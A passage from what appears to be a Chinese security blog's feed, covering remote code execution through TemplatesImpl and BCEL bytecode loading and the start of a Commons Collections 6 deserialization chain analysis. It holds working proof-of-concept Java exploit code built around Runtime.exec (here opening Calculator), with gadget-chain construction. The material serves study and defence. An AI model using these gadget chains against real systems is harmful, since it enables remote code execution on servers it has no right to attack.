obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，为顺利的从newTransformer()方法到达TransletClassLoader类，须满足这个过程中的种种限制，首先是<code>_name</code>不能为null，可以为任意字符，因为在getTransletInstance方法中存在对<code>_name</code>的非null判断；<code>_tfactory</code>则需要是一个TransformerFactoryImpl对象，因为在defineTransletClasses方法中有调用到<code>_tfactory.getExternalExtensionsMap()</code>，getExternalExtensionsMap属于TransformerFactoryImpl类；最后的<code>_bytecodes</code>是由字节码组成的数组。</p><p>另外，在TemplatesImpl中对加载的字节码也是有要求的，原因是因为在getTransletInstance方法中会通过反射实例化一个AbstractTranslet对象，即<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>代码行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ……</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为保证此处能够成功实例化，<code>_transletIndex</code>不可等于默认值-1，但不过在defineTransletClasses方法中有对<code>_transletIndex</code>进行重新赋值，满足<code>(superClass.getName().equals(ABSTRACT_TRANSLET))</code>判别式即可，即加载的字节码对应的类的父类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ……</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面提到了getTransletIndex行不通，这是因为在getTransletIndex中压根就没有调用到newInstance进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// Falls through</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _transletIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此，构造如下继承AbstractTranslet的RCE类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCE</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RCE</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译它，并复制class的Base64编码，将编码内容放置在如上利用代码中的decode方法中，运行便会弹出计算器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac RCE.java &amp;&amp; <span class="built_in">cat</span> RCE.class | <span class="built_in">base64</span> | pbcopy</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/6.png"></p><p>当然，还可以通过使用javassist将RCE生成字节码的方式。如下，运行后依旧弹出计算器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplRCE2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;RCE2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clas.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clas.makeClassInitializer();</span><br><span class="line">        constructor.insertBefore(cmd);</span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如上代码将生成如下RCE2</span></span><br><span class="line"><span class="comment">        import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        public class RCE2 extends AbstractTranslet &#123;</span></span><br><span class="line"><span class="comment">            static &#123;</span></span><br><span class="line"><span class="comment">                Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            public RCE2() &#123;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">temp</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(obj,<span class="string">&quot;T&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(obj, temp,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, temp,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, temp,<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">        <span class="comment">// obj.getTransletIndex();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,Class clas, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/7.png"></p><p>如上使用的完整利用链为newTransformer()—&gt;getTransletInstance()—&gt;defineTransletClasses()—&gt;TransletClassLoader，如果继续对newTransformer方法进行Find Usages，会发现它在getOutputProperties方法中有被调用，getOutputProperties方法的访问修饰符为public，完全满足利用条件，这相当于有两种不同的利用链实现，虽然两者存在重叠，但依旧能够扩展在实际利用中的多样性和可能性，譬如在CommonsBeanutils1、Fastjson反序列化利用中就会用到getOutputProperties，而非直接用到newTransformer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()—&gt;newTransformer()—&gt;getTransletInstance()—&gt;defineTransletClasses()—&gt;TransletClassLoader</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-classloader/8.png"></p><h2 id="0x04-BCEL"><a href="#0x04-BCEL" class="headerlink" title="0x04 BCEL"></a>0x04 BCEL</h2><p>BCEL全称Byte Code Engineering Library，顾名思义，它是Apache Commons下的一个用于操作Java字节码的库，BCEL旨在为用户提供一种便捷的方式来分析、创建和操作以.class结尾的二进制Java类文件，使用户能够在编译后的Java类文件级别上进行操作，而不是仅限于源代码级别。</p><p>BCEL提供了两个核心类，即com.sun.org.apache.bcel.internal.Repository和com.sun.org.apache.bcel.internal.Utility。Repository用于管理已加载的类和其对应的字节码信息，其提供了一个lookupClass用以查找已加载的类；Utility则提供了一系列静态方法用于操作字节码，例如对打印或编码字节码。</p><p>如下对BCEL加载字节码做演示，首先还是准备一个恶意Evil类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下构造如下利用代码，其中Utility.encode方法用于将字节数组编码为一个字符串表示形式，如果接受的第二个参数为true，则会先对字节数组进行gzip压缩，然后再进行编码为字符串形式。最后使用ClassLoader加载类，并实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cl.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">jcls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(jcls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终执行如上程序后便会弹出计算器。</p><p><img src="/img/post/java-classloader/9.png"></p><p>BCEL在Java 8u251及之后的版本中无法使用，这是由于在后续的版本中com.sun.org.apache.bcel.internal.util.ClassLoader已被移除。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xalan.apache.org/">https://xalan.apache.org/</a></p><p><a href="https://commons.apache.org/proper/commons-bcel/">https://commons.apache.org/proper/commons-bcel/</a></p><p><a href="https://www.javasec.org/javase/ClassLoader/">https://www.javasec.org/javase/ClassLoader/</a></p><p><a href="https://github.com/phith0n/JavaThings/">https://github.com/phith0n/JavaThings/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞之CommonsCollections6链</title>
      <link href="/java-deserialization-cc6.html"/>
      <url>/java-deserialization-cc6.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E8%83%8C%E6%99%AF">0x00 背景</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">0x01 影响范围</a></li><li><a href="#0x02-%E5%89%8D%E6%83%85%E5%9B%9E%E9%A1%BE">0x02 前情回顾</a></li><li><a href="#0x03-tiedmapentryhashcode">0x03 TiedMapEntry#hashCode</a></li><li><a href="#0x04-hashmap">0x04 HashMap</a></li><li><a href="#0x05-hashset">0x05 HashSet</a></li><li><a href="#0x06-%E5%8F%82%E8%80%83">0x06 参考</a></li></ul><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在前面关于CommonsCollections1链的两篇文章中，都提到了该链的利用是需要JDK版本小于8u71，这一限制会降低此链在实战中的利用率。</p><p>有一条常用链不受JDK版本的限制，即CommonsCollections6链（后续简称CC6链），CC6与CC1相比，Kick-off入口类发生了变化，还增加了一个<code>TiedMapEntry</code>中间Gadget链，后续的<code>LazyMap</code>中间Gadget链和Sink依旧没变，对于部分重复的内容，在本文将不再赘述，如果对此不够了解，建议从前两篇文章开始看起。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>虽然CC6链不像CC1那样会受到JDK版本的约束，但对于Commons Collections的版本也是要求在3.0以上、3.2.2以下，即大于等于3.1且小于等于3.2.1。</p><h2 id="0x02-前情回顾"><a href="#0x02-前情回顾" class="headerlink" title="0x02 前情回顾"></a>0x02 前情回顾</h2><p>上一篇<a href="./java-deserialization-cc1-lazymap">《Java反序列化漏洞之LazyMap版CC1链》</a>文章中，有对<code>LazyMap</code>中间Gadget链做详细分析，通过向<code>LazyMap#decorate</code>方法传入一个恶意的<code>ChainedTransformer</code>对象作为恶意的<code>factory</code>，然后调用<code>LayzMap#get</code>方法，便会触发恶意行为。而<code>LayzMap#get</code>方法的触发是则是通过动态代理调用<code>AnnotationInvocationHandler.invoke</code>方法。</p><p>在CC6链中，就没有用到动态代理的技术去调用<code>AnnotationInvocationHandler.invoke</code>方法以触发<code>LayzMap#get</code>方法，而是通过<code>TiedMapEntry#hashCode</code>方法做到的。</p><h2 id="0x03-TiedMapEntry-hashCode"><a href="#0x03-TiedMapEntry-hashCode" class="headerlink" title="0x03 TiedMapEntry#hashCode"></a>0x03 TiedMapEntry#hashCode</h2><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>也是Apache Commons Collections库中的一个类，它用于表示键值对的条目，<code>TiedMapEntry</code>类实现了表示映射条目的<code>Map.Entry</code>、表示键值对的<code>KeyValue</code>和用于序列化的<code>Serializable</code>接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 直接从map中获取此条目的值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 省略部分无关代码 ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取与equals方法兼容的hashCode</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TiedMapEntry</code>类中的<code>hashCode</code>方法将条目的键和值的哈希码进行异或运算，以计算条目的哈希码。在<code>hashCode</code>方法中有对<code>getValue</code>方法进行调用，而<code>getValue</code>中又存在<code>map.get</code>调用，这样便能够触发<code>LayzMap#get</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tcChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), tcChain);</span><br><span 